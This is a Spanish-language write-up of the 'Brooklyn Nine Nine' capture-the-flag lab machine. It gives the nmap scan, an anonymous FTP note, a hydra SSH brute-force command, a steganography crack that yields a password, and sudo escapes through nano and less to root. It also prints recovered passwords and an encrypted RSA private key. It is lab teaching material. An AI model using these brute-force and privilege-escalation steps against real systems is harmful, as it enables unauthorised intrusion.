# Brooklyn Nine Nine
## Initial Scan
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.95.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```
## Enum 
### FTP 
Tenemos un login Anonymous habilitado, entramos y solo podemos recuperar lo siguiente
```
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
```
El archivo nos habla de un user con una pass debil
```
Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
Vamos a probar a tirar de bruteforcing 
```
hydra -l jake -P ~/rockyou.txt ssh://10.10.128.204
```
Y tenemos la pass 
```
[22][ssh] host: 10.10.128.204   login: jake   password: 987654321
```

### HTTP
En el fuente de la página encontramos el siguiente comentario:
```html
<!-- Have you ever heard of steganography? -->
```
Y la pagina parece tener solamente una imagen asi que descargemosla y probemos con stegcracker
```
Attacking file 'brooklyn99.jpg' with wordlist '~/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20458 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```
Veamos el archivo:
```
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Con esto ya podemos entrar como holt

## Privesc
### Holt 
```
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
Easy Peasy
```
holt@brookly_nine_nine:~$: sudo /bin/nano -s /bin/sh
> /bin/sh
> [CTRL + T]
root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Jake
```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
Easy 2.0
```
jake@brookly_nine_nine:~$ sudo less /etc/profile
> !/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Amy

Dentro de la carpeta de amy encontramos una clave rsa
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,8A45EF5CE95F44B523FBD6AEEAD2B9E6

//MOmD5ttJ6rTXqLiBtvOmCcXLWmgexGwQZc2sy6P9mVlh9nUD2g2gN/SwyOIOzo
pWBjAatk7qpqwbsGDstQsKErCDGCH/qjF49zG1meMNbzxFQAT5vOxGM/0oYJwD9F
BKeRcOqY0vKjiJz0Wf9ZA3+CF3xdjNvVhneGe3BE1jEX2J3+sGZ0qiNLkYn6Mw+h
jDLglBkq1qNxsGD1uKI6Hau4tOykPDphrhTiY+os7zyloEaVto53d1JUolL0W6qG
OwjIY37KP0VjwUClUivwu24yWJLZ8ISIy+PVb9AXcOSERxSFbXpuWMVurYpenc5a
TyinBbDZI31+xStteQYCb3SrnPlHQC1waAMr22RzXMSNpdJ29D7Use8CMMsBofFv
5v43IhNuNVuGik1Qoh4kg45aIW4PHpEIzHqz89hzHnTNJnbkZIri4VPDu1+tgeUB
YVXclhpOXj+AI8FeJix1OIW6lGQM48iApBq0GQn5877vxaepP2A2BU44Ips2WYvG
WxD8u9nW7muG8hEtU/Jmz1v1j5PIJm9BENkam/4/7VRbGw2RO3FUjpAHsdnzr+k5
yZ/sxWpVkIhbO3SO3/+TUTIAODZJ3fJB5fHspXCwIjWoU4ff6aW+LsDv5rpXbrxt
IqA+mpn31fwr0nmVYS/+seDA0atdFl6c+1Zav7dSoNF+hlqssxX7YXm3+LGQdQWa
gSNNSS3Cj6gyPUSs6+t0mKHzgnB/Ofah2epLzi9/K+UxKtyCjnKlYV8GSH+EZIPk
YPKGnzHet4QRrhP6YYeBfatDeblxIQZX1u6G9gGkWqFFIXgMe2wDyaoBA/cS2/am
GcS1SP0tNOZCsAMz5Q87YG44nhaSJReuUnna4fHBhti6pymWZYXvecovB/23xpNu
LDkoxmZDa/jUfO0Ua9xuhjp3usT3Nin2iAUl3inLXzpr6wQDoW1OuZbV6jitqdMv
v1Yf/Ycn5/g07aCpVAv8VyZ1J2/ilDOFuaVPQBJXKsm79fbLbXj2gTGjwKTo2JBa
EqPBMxD1X2gKxUQky9c/W1NfvZ1DqdU2+KC9o/qztuWRzO+MA/UwGKEJ93mcmeqA
6cxRy+IuzuS4/U7EegNLd6VkAJANYgXmr6Q3HlzuH8opFvh33VFejww4/w99jQfZ
mTSqSPS0QX9Sdo7U58IfDq+j13Il/aymcSWkBw6/DDwdDzl/7ZQ/X/XqE0Jjh1QY
Ro6xjI5LnDDCZjXkNu0Da/AfQG/Y0AzZUylhnH0/l4vdXPGDRffxlEQQNnGKwGk9
GSFvIHuEni9c/G7vW/wNgI9mSlycR02oCVyInHMepcLWDYyIAyFEyh/G65iGG0Z/
Y6cdOJSYTyuwVbK8469YHowvD4/7urHaSLeNmViT+URyoRLp9wV/8HaNMW5q5i6D
p0TrrdkFQiDR5X+rbfL+EgFYCwOanABkK+FzptbXB0ABte7L+PSICvZKsCn/yo6z
fxraAZ0nJejWQEYEH99o7T7uHkR+CZSD8gWPBsaP8pfPJSeKR9LzXG3MOWGc+5/p
gZBPQI5EwbUaWtnwEKqzTqT1G/+iYps8ExqUGj9lZWPnwNAEnWXiKJfTZF2lJyqz
-----END RSA PRIVATE KEY-----

```
Si la crackeamos veremos que la contraseña es jake1 , el problema es que nos pide pass y clave para entrar como amy, asi que no se de donde sacarla
